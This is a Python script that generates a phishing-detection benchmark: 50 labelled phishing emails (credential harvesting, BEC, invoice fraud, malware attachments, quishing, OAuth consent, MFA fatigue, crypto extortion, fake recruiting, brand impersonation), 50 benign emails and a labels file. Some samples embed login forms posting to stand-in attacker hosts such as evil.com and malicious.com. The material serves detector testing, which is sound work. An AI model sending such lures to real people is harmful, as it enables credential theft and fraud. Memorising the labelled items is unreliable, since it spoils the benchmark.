import os
import json

phishing_samples = [
    # Credential Harvesting
    {"name": "CredHarv_1", "category": "Credential Harvesting", "text": "Subject: Action Required: Verify Your Account\nFrom: support@paypal-security-team.net\nTo: victim@company.com\n\nPlease verify your account immediately. Login to continue using your services.\n<form action='http://malicious.com/login' method='POST'>\n  <input type='password' name='password' />\n</form>"},
    {"name": "CredHarv_2", "category": "Credential Harvesting", "text": "Subject: Password Expiry Notice\nFrom: it-admin@company-portal-update.com\nTo: victim@company.com\n\nYour password expires in 24 hours. Click <a href='http://evil.com/login'>here</a> to update your billing. Sign in to prevent lockout.\n<form action='http://evil.com/submit' type='password'></form>"},
    {"name": "CredHarv_3", "category": "Credential Harvesting", "text": "Subject: Secure Document Shared\nFrom: no-reply@sharepoint-secure-doc.com\nTo: victim@company.com\n\nLogin to continue to view the secure document. <a href='http://phish.net/login'>Click here</a> to verify your account.\n<form action='http://phish.net/auth' type='password'></form>"},
    {"name": "CredHarv_4", "category": "Credential Harvesting", "text": "Subject: Update your billing information\nFrom: netflix@billing-update-service.com\nTo: victim@company.com\n\nSign in to update your billing information. <form action='http://badactor.com/login' type='password'></form>"},
    {"name": "CredHarv_5", "category": "Credential Harvesting", "text": "Subject: Microsoft 365 Verification\nFrom: admin@m365-alert-center.com\nTo: victim@company.com\n\nPlease verify your account to restore email access. Login to continue.\n<form action='http://stealer.com/post' type='password'></form>"},
    
    # BEC
    {"name": "BEC_1", "category": "Business Email Compromise (BEC)", "text": "Subject: Urgent: Wire Transfer Required\nFrom: CEO Name <ceo-name@gmail.com>\nTo: cfo@company.com\n\nAre you at your desk? I need an urgent wire transfer processed ASAP for a new vendor."},
    {"name": "BEC_2", "category": "Business Email Compromise (BEC)", "text": "Subject: Payment instructions ASAP\nFrom: Director <director-urgent@yahoo.com>\nTo: finance@company.com\n\nPlease process this invoice payment immediately. The wire transfer details are attached. Let me know when it's done."},
    {"name": "BEC_3", "category": "Business Email Compromise (BEC)", "text": "Subject: Urgent: Gift card purchase\nFrom: Boss <boss-urgent@hotmail.com>\nTo: admin@company.com\n\nI need a favor. I'm stuck in a meeting, can you buy some Apple gift cards for a client? It's urgent."},
    {"name": "BEC_4", "category": "Business Email Compromise (BEC)", "text": "Subject: Updated Bank Details\nFrom: Vendor Contact <vendor@gmail.com>\nTo: ap@company.com\n\nUrgent: Please update our routing number for the upcoming payment. Immediate action required to prevent delay."},
    {"name": "BEC_5", "category": "Business Email Compromise (BEC)", "text": "Subject: ASAP Wire Transfer\nFrom: Executive <exec@gmail.com>\nTo: treasury@company.com\n\nAre you at your desk? I need an urgent wire transfer for an acquisition. Keep it confidential."},

    # Invoice Fraud
    {"name": "Invoice_1", "category": "Invoice Fraud Attempt", "text": "Subject: Unpaid Invoice #10294\nFrom: billing@unknown-vendor123.com\nTo: ap@company.com\n\nPlease find the attached unpaid invoice for Q3 services. Kindly process payment.\n<a href='http://malicious.com/invoice.pdf'>Download Attachment</a>"},
    {"name": "Invoice_2", "category": "Invoice Fraud Attempt", "text": "Subject: Remittance Advice - Payment Overdue\nFrom: accounts@fake-supplier.net\nTo: finance@company.com\n\nYour payment is overdue. See the attached billing statement.\nAttachment: invoice.zip"},
    {"name": "Invoice_3", "category": "Invoice Fraud Attempt", "text": "Subject: Invoice Attached: Action Required\nFrom: no-reply@invoicing-portal-fake.com\nTo: victim@company.com\n\nThe invoice attached requires your attention.\n<a href='http://evil.com/pay'>View Invoice</a>"},
    {"name": "Invoice_4", "category": "Invoice Fraud Attempt", "text": "Subject: Outstanding Billing Statement\nFrom: collections@scam-agency.com\nTo: victim@company.com\n\nYou have an unpaid invoice. Click the link to view the billing statement.\n<a href='http://phish.com/bill'>Link</a>"},
    {"name": "Invoice_5", "category": "Invoice Fraud Attempt", "text": "Subject: Payment Overdue - Remittance Advice\nFrom: ap@unknown-domain.com\nTo: victim@company.com\n\nRemittance advice attached for your unpaid invoice.\nAttachment: statement.pdf (Macro)"},

    # Malware Delivery
    {"name": "Malware_1", "category": "Malware Delivery", "text": "Subject: Scanned Document from Copier\nFrom: scanner@company.com\nTo: victim@company.com\n\nPlease find the scanned document attached.\nAttachment: document.exe"},
    {"name": "Malware_2", "category": "Malware Delivery", "text": "Subject: Q4 Financial Report\nFrom: finance@partner.com\nTo: victim@company.com\n\nPlease open the attached report and enable macros to view the full data.\nAttachment: report.docm"},
    {"name": "Malware_3", "category": "Malware Delivery", "text": "Subject: Important Update\nFrom: IT@company.com\nTo: victim@company.com\n\nRun the attached script to update your system.\nAttachment: update.vbs"},
    {"name": "Malware_4", "category": "Malware Delivery", "text": "Subject: Delivery Notification\nFrom: tracking@fedex-fake.com\nTo: victim@company.com\n\nYour package was not delivered. Open the receipt to see details.\nAttachment: receipt.scr"},
    {"name": "Malware_5", "category": "Malware Delivery", "text": "Subject: Resume / Application\nFrom: applicant@gmail.com\nTo: hr@company.com\n\nPlease review my resume. You may need to enable content to view the formatting.\nAttachment: resume.doc"},

    # QR Phishing
    {"name": "QR_1", "category": "QR Code Phishing (Quishing)", "text": "Subject: Enable 2FA Now\nFrom: security@company-auth.com\nTo: victim@company.com\n\nPlease scan the code below to enable 2FA.\n<img src='cid:qr1' />"},
    {"name": "QR_2", "category": "QR Code Phishing (Quishing)", "text": "Subject: Mobile Device Management Setup\nFrom: it@company.com\nTo: victim@company.com\n\nScan the QR code with your phone to enroll your device.\n<img src='cid:qr_image' />"},
    {"name": "QR_3", "category": "QR Code Phishing (Quishing)", "text": "Subject: Mandatory Security Update\nFrom: admin@portal.com\nTo: victim@company.com\n\nTo continue using your account, scan the code.\n<img src='cid:123' />"},
    {"name": "QR_4", "category": "QR Code Phishing (Quishing)", "text": "Subject: Access your new benefits\nFrom: hr@benefits.com\nTo: victim@company.com\n\nScan the QR code to log into the benefits portal.\n<img src='http://evil.com/qr.png' />"},
    {"name": "QR_5", "category": "QR Code Phishing (Quishing)", "text": "Subject: Wi-Fi Password Update\nFrom: facilities@company.com\nTo: victim@company.com\n\nScan the code to update your Wi-Fi profile on mobile.\n<img src='cid:qr5' />"},

    # OAuth Consent
    {"name": "OAuth_1", "category": "OAuth Consent Phishing", "text": "Subject: Connect new App\nFrom: app@cloud.com\nTo: victim@company.com\n\nPlease authorize the new meeting app.\n<a href='https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=bad&prompt=consent'>Authorize</a>"},
    {"name": "OAuth_2", "category": "OAuth Consent Phishing", "text": "Subject: Google Drive Integration\nFrom: integration@service.com\nTo: victim@company.com\n\nLink your account.\n<a href='https://accounts.google.com/o/oauth2/auth?client_id=123&response_type=code'>Link Now</a>"},
    {"name": "OAuth_3", "category": "OAuth Consent Phishing", "text": "Subject: HR Portal Update\nFrom: hr@company.com\nTo: victim@company.com\n\nGrant access to the new HR portal.\n<a href='https://login.microsoftonline.com/common/oauth2/authorize?client_id=malicious&prompt=consent'>Grant Access</a>"},
    {"name": "OAuth_4", "category": "OAuth Consent Phishing", "text": "Subject: Zoom Plugin Update\nFrom: zoom@plugin.com\nTo: victim@company.com\n\nUpdate your plugin.\n<a href='https://accounts.google.com/o/oauth2/v2/auth?client_id=evil&response_type=code'>Update</a>"},
    {"name": "OAuth_5", "category": "OAuth Consent Phishing", "text": "Subject: Calendar Sync Required\nFrom: sync@app.com\nTo: victim@company.com\n\nSync your calendar to continue receiving invites.\n<a href='https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=steal&prompt=consent'>Sync</a>"},

    # MFA Fatigue
    {"name": "MFA_1", "category": "MFA Fatigue / Push Spam", "text": "Subject: Multiple Failed Login Attempts\nFrom: security@company.com\nTo: victim@company.com\n\nWe detected multiple suspicious login attempts. If this wasn't you, call support immediately. If it was, approve the prompt on your phone."},
    {"name": "MFA_2", "category": "MFA Fatigue / Push Spam", "text": "Subject: Suspicious Sign-in Blocked\nFrom: alerts@microsoft-security.com\nTo: victim@company.com\n\nWe blocked a suspicious login attempt. Please approve the notification sent to your authenticator app to verify your identity immediately."},
    {"name": "MFA_3", "category": "MFA Fatigue / Push Spam", "text": "Subject: Action Required: Verification Code\nFrom: no-reply@auth.com\nTo: victim@company.com\n\nSomeone is trying to access your account. Please approve the request to secure your account immediately or call support."},
    {"name": "MFA_4", "category": "MFA Fatigue / Push Spam", "text": "Subject: OTP Alert - Multiple Attempts\nFrom: otp@bank.com\nTo: victim@company.com\n\nMultiple OTP requests were made. Deny if not you, or approve immediately to confirm."},
    {"name": "MFA_5", "category": "MFA Fatigue / Push Spam", "text": "Subject: Urgent: Security Alert\nFrom: admin@company.com\nTo: victim@company.com\n\nWe noticed multiple suspicious authentication code requests. Please approve the push notification to resolve this immediately."},

    # Crypto Scam
    {"name": "Crypto_1", "category": "Cryptocurrency Extortion / Scam", "text": "Subject: Your device is compromised\nFrom: hacker@evil.com\nTo: victim@company.com\n\nI have compromised your computer. Send payment of 1 Bitcoin to wallet address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa or I will release your data."},
    {"name": "Crypto_2", "category": "Cryptocurrency Extortion / Scam", "text": "Subject: Guaranteed Return on Investment\nFrom: broker@crypto-invest.com\nTo: victim@company.com\n\nInvest in our new ETH pool for a guaranteed return of 50%. Deposit ETH to 0x71C7656EC7ab88b098defB751B7401B5f6d8976F now."},
    {"name": "Crypto_3", "category": "Cryptocurrency Extortion / Scam", "text": "Subject: Final Warning\nFrom: anonymous@darkweb.net\nTo: victim@company.com\n\nPay 0.5 BTC to 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 immediately to stop the DDoS extortion."},
    {"name": "Crypto_4", "category": "Cryptocurrency Extortion / Scam", "text": "Subject: Exclusive Crypto Investment\nFrom: vip@crypto-gains.com\nTo: victim@company.com\n\nJoin our VIP crypto investment group. High guaranteed returns! Send BTC to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"},
    {"name": "Crypto_5", "category": "Cryptocurrency Extortion / Scam", "text": "Subject: Hack Notice\nFrom: attacker@protonmail.com\nTo: victim@company.com\n\nYour account was hacked. Send payment in bitcoin to 1KFHE7w8BhaENAswwryaoccDb6qcT6DbYY to recover it."},

    # Fake Recruiting
    {"name": "Recruit_1", "category": "Fake Recruiting Campaign", "text": "Subject: Job Offer: Remote Data Entry\nFrom: recruiter@gmail.com\nTo: victim@company.com\n\nWe would like to extend a job offer for remote work. Please provide your SSN and bank details for payroll setup."},
    {"name": "Recruit_2", "category": "Fake Recruiting Campaign", "text": "Subject: Interview Request\nFrom: hr-manager@yahoo.com\nTo: victim@company.com\n\nWe loved your resume. We want to schedule an interview request. Please pay the $50 background check fee via western union."},
    {"name": "Recruit_3", "category": "Fake Recruiting Campaign", "text": "Subject: Hiring Immediately: Work from Home\nFrom: staffing@hotmail.com\nTo: victim@company.com\n\nWe are hiring for work from home positions. Send an upfront payment for equipment deposit."},
    {"name": "Recruit_4", "category": "Fake Recruiting Campaign", "text": "Subject: Your Application Status\nFrom: careers@gmail.com\nTo: victim@company.com\n\nTo proceed with your job offer, we need you to wire the visa sponsorship fee."},
    {"name": "Recruit_5", "category": "Fake Recruiting Campaign", "text": "Subject: Remote Work Opportunity\nFrom: jobs@yahoo.com\nTo: victim@company.com\n\nAccept this remote work offer by sending your social security number and banking info."},

    # Brand Impersonation
    {"name": "Brand_1", "category": "Brand Impersonation", "text": "Subject: Action Required: Your Account\nFrom: PayPal Support <admin@paypa1-security.com>\nTo: victim@company.com\n\nYour paypal account has been limited. Please resolve this issue."},
    {"name": "Brand_2", "category": "Brand Impersonation", "text": "Subject: Microsoft 365 Alert\nFrom: Microsoft Security <alert@m1crosoft-alert.net>\nTo: victim@company.com\n\nMicrosoft detected unusual activity on your account."},
    {"name": "Brand_3", "category": "Brand Impersonation", "text": "Subject: Apple ID Locked\nFrom: Apple Support <support@apple-recovery-service.com>\nTo: victim@company.com\n\nYour Apple ID has been locked for security reasons."},
    {"name": "Brand_4", "category": "Brand Impersonation", "text": "Subject: Amazon Order Confirmation\nFrom: Amazon Orders <orders@amaz0n-store.com>\nTo: victim@company.com\n\nThank you for your Amazon order of $1,200."},
    {"name": "Brand_5", "category": "Brand Impersonation", "text": "Subject: Security Alert\nFrom: Microsoft Team <admin@micros0ft.com>\nTo: victim@company.com\n\nYour microsoft account requires immediate attention."}
]

benign_samples = [
    {"name": "Benign_OOO_1", "text": "Subject: Out of Office: Urgent Matters\nFrom: coworker@company.com\nTo: team@company.com\n\nI am out of the office this week. For urgent matters, please contact my manager."},
    {"name": "Benign_OOO_2", "text": "Subject: OOO - Vacation\nFrom: boss@company.com\nTo: direct-reports@company.com\n\nI will be on vacation. Please handle any urgent wire transfer requests with Finance directly."},
    {"name": "Benign_OOO_3", "text": "Subject: Auto-Reply: Out of Office\nFrom: sales@partner.com\nTo: victim@company.com\n\nThank you for your email. I am currently out of the office."},
    {"name": "Benign_OOO_4", "text": "Subject: OOO until Monday\nFrom: marketing@company.com\nTo: victim@company.com\n\nPlease reach out to Jane if you need anything immediately."},
    {"name": "Benign_OOO_5", "text": "Subject: Automatic Reply: Meeting\nFrom: hr@company.com\nTo: victim@company.com\n\nI am in an all-day training and will reply ASAP."},

    {"name": "Benign_HR_1", "text": "Subject: Open Enrollment for Benefits\nFrom: hr@company.com\nTo: all-staff@company.com\n\nIt is time for open enrollment. Please log into the portal to select your benefits."},
    {"name": "Benign_HR_2", "text": "Subject: Welcome New Hire\nFrom: hr@company.com\nTo: all-staff@company.com\n\nPlease welcome our new developer, John Doe!"},
    {"name": "Benign_HR_3", "text": "Subject: Policy Update\nFrom: compliance@company.com\nTo: all-staff@company.com\n\nPlease review the attached updated employee handbook. No need to enable macros."},
    {"name": "Benign_HR_4", "text": "Subject: Upcoming Holiday\nFrom: hr@company.com\nTo: all-staff@company.com\n\nThe office will be closed on Monday for the holiday."},
    {"name": "Benign_HR_5", "text": "Subject: Mandatory Training\nFrom: security-training@company.com\nTo: victim@company.com\n\nPlease complete your annual security training by Friday."},

    {"name": "Benign_Jira_1", "text": "Subject: [JIRA] (PROJ-123) Update database schema\nFrom: jira@company.atlassian.net\nTo: victim@company.com\n\nBob commented on PROJ-123: I will handle this task."},
    {"name": "Benign_Jira_2", "text": "Subject: [JIRA] Assigned to you: PROJ-456\nFrom: jira@company.atlassian.net\nTo: victim@company.com\n\nYou have been assigned a new high priority issue. Please resolve immediately."},
    {"name": "Benign_Jira_3", "text": "Subject: [JIRA] Status changed to DONE\nFrom: jira@company.atlassian.net\nTo: victim@company.com\n\nThe issue PROJ-789 has been marked as Done."},
    {"name": "Benign_Jira_4", "text": "Subject: [JIRA] Mentioned you\nFrom: jira@company.atlassian.net\nTo: victim@company.com\n\nAlice mentioned you in a comment: Please verify the login functionality."},
    {"name": "Benign_Jira_5", "text": "Subject: [JIRA] Sprint Planning\nFrom: jira@company.atlassian.net\nTo: victim@company.com\n\nNew sprint has started."},

    {"name": "Benign_GH_1", "text": "Subject: [GitHub] Pull Request #42 opened\nFrom: notifications@github.com\nTo: victim@company.com\n\nA new PR was opened in the repository."},
    {"name": "Benign_GH_2", "text": "Subject: [GitHub] Merge conflict in main\nFrom: notifications@github.com\nTo: victim@company.com\n\nPlease resolve the merge conflicts immediately."},
    {"name": "Benign_GH_3", "text": "Subject: [GitHub] Review requested\nFrom: notifications@github.com\nTo: victim@company.com\n\nJane requested your review on PR #45."},
    {"name": "Benign_GH_4", "text": "Subject: [GitHub] Issue closed\nFrom: notifications@github.com\nTo: victim@company.com\n\nThe issue #12 was closed by a commit."},
    {"name": "Benign_GH_5", "text": "Subject: [GitHub] Security vulnerability alert\nFrom: notifications@github.com\nTo: victim@company.com\n\nDependabot found a vulnerability in your dependencies. Please update."},

    {"name": "Benign_Cal_1", "text": "Subject: Accepted: Project Sync\nFrom: coworker@company.com\nTo: victim@company.com\n\nCoworker has accepted your meeting request."},
    {"name": "Benign_Cal_2", "text": "Subject: Declined: Weekly Standup\nFrom: boss@company.com\nTo: victim@company.com\n\nI have a conflict and cannot attend."},
    {"name": "Benign_Cal_3", "text": "Subject: Invitation: Client Meeting\nFrom: sales@company.com\nTo: victim@company.com\n\nPlease join the client meeting to discuss the invoice."},
    {"name": "Benign_Cal_4", "text": "Subject: Updated: Quarterly Review\nFrom: hr@company.com\nTo: victim@company.com\n\nThe time for the quarterly review has changed."},
    {"name": "Benign_Cal_5", "text": "Subject: Canceled: Lunch\nFrom: friend@company.com\nTo: victim@company.com\n\nSorry, I have to cancel our lunch today."},

    {"name": "Benign_News_1", "text": "Subject: Tech Weekly Newsletter\nFrom: news@techweekly.com\nTo: victim@company.com\n\nRead the latest news in technology."},
    {"name": "Benign_News_2", "text": "Subject: Your Daily Digest\nFrom: digest@news.com\nTo: victim@company.com\n\nHere are the top stories for today."},
    {"name": "Benign_News_3", "text": "Subject: Cybersecurity Trends\nFrom: marketing@security-vendor.com\nTo: victim@company.com\n\nLearn about the latest trends in phishing and malware delivery."},
    {"name": "Benign_News_4", "text": "Subject: Product Updates\nFrom: updates@software.com\nTo: victim@company.com\n\nWe have released a new version of our software."},
    {"name": "Benign_News_5", "text": "Subject: Community Highlights\nFrom: community@forum.com\nTo: victim@company.com\n\nSee what the community is talking about."},

    {"name": "Benign_Bank_1", "text": "Subject: Statement Available\nFrom: alerts@chase.com\nTo: victim@company.com\n\nYour monthly statement is ready to view online."},
    {"name": "Benign_Bank_2", "text": "Subject: Payment Confirmation\nFrom: service@paypal.com\nTo: victim@company.com\n\nYour payment of $50 has been processed."},
    {"name": "Benign_Bank_3", "text": "Subject: Direct Deposit Received\nFrom: alerts@bankofamerica.com\nTo: victim@company.com\n\nYour payroll direct deposit has been credited to your account."},
    {"name": "Benign_Bank_4", "text": "Subject: Fraud Alert Service Active\nFrom: fraud-alerts@citi.com\nTo: victim@company.com\n\nYour fraud alert monitoring service is active."},
    {"name": "Benign_Bank_5", "text": "Subject: New Login from Unknown Device\nFrom: security@chase.com\nTo: victim@company.com\n\nWe noticed a login from a new device. If this was you, you can ignore this email."},

    {"name": "Benign_Univ_1", "text": "Subject: Alumni Newsletter\nFrom: alumni@university.edu\nTo: victim@company.com\n\nRead about the latest achievements of our alumni."},
    {"name": "Benign_Univ_2", "text": "Subject: Library Book Due\nFrom: library@university.edu\nTo: victim@company.com\n\nYour checked out book is due tomorrow."},
    {"name": "Benign_Univ_3", "text": "Subject: Registration Opens Tomorrow\nFrom: registrar@university.edu\nTo: victim@company.com\n\nCourse registration for the fall semester opens tomorrow."},
    {"name": "Benign_Univ_4", "text": "Subject: Campus Security Update\nFrom: security@university.edu\nTo: victim@company.com\n\nPlease be aware of a recent incident near campus."},
    {"name": "Benign_Univ_5", "text": "Subject: Transcript Request Received\nFrom: transcripts@university.edu\nTo: victim@company.com\n\nWe have received your request for an official transcript."},

    {"name": "Benign_Int_1", "text": "Subject: Lunch in the breakroom\nFrom: coworker@company.com\nTo: all-staff@company.com\n\nThere is leftover pizza in the breakroom."},
    {"name": "Benign_Int_2", "text": "Subject: Happy Birthday!\nFrom: team@company.com\nTo: victim@company.com\n\nWishing you a very happy birthday today!"},
    {"name": "Benign_Int_3", "text": "Subject: Quick question about the project\nFrom: manager@company.com\nTo: victim@company.com\n\nCan you call me when you have a minute to discuss the project?"},
    {"name": "Benign_Int_4", "text": "Subject: Coffee machine is broken\nFrom: facilities@company.com\nTo: all-staff@company.com\n\nWe are aware the coffee machine is broken and are fixing it ASAP."},
    {"name": "Benign_Int_5", "text": "Subject: Friday Happy Hour\nFrom: social@company.com\nTo: all-staff@company.com\n\nJoin us for virtual happy hour this Friday at 4pm."},

    {"name": "Benign_Support_1", "text": "Subject: Re: Ticket #12345\nFrom: support@software-vendor.com\nTo: victim@company.com\n\nWe have investigated your issue and deployed a fix. Please test."},
    {"name": "Benign_Support_2", "text": "Subject: Your Support Request\nFrom: helpdesk@company.com\nTo: victim@company.com\n\nYour IT support ticket has been closed."},
    {"name": "Benign_Support_3", "text": "Subject: Password Reset Confirmation\nFrom: support@trusted-app.com\nTo: victim@company.com\n\nYour password has been successfully reset. If you did not request this, contact us."},
    {"name": "Benign_Support_4", "text": "Subject: Feature Request Received\nFrom: product@vendor.com\nTo: victim@company.com\n\nThank you for your feature request. Our team will review it."},
    {"name": "Benign_Support_5", "text": "Subject: Maintenance Notification\nFrom: status@cloud-provider.com\nTo: victim@company.com\n\nWe will be performing scheduled maintenance this weekend."}
]

import os

os.makedirs("benchmark_dataset/phishing", exist_ok=True)
os.makedirs("benchmark_dataset/benign", exist_ok=True)

# Write all files
for p in phishing_samples:
    with open(f"benchmark_dataset/phishing/{p['name']}.eml", "w") as f:
        f.write(p['text'])

for b in benign_samples:
    with open(f"benchmark_dataset/benign/{b['name']}.eml", "w") as f:
        f.write(b['text'])

# Write labels file
labels = {}
for p in phishing_samples:
    labels[p['name'] + ".eml"] = {"type": "phishing", "expected_category": p['category']}
for b in benign_samples:
    labels[b['name'] + ".eml"] = {"type": "benign", "expected_category": None}

with open("benchmark_dataset/labels.json", "w") as f:
    json.dump(labels, f, indent=4)

print(f"Generated {len(phishing_samples)} phishing and {len(benign_samples)} benign samples in benchmark_dataset/")
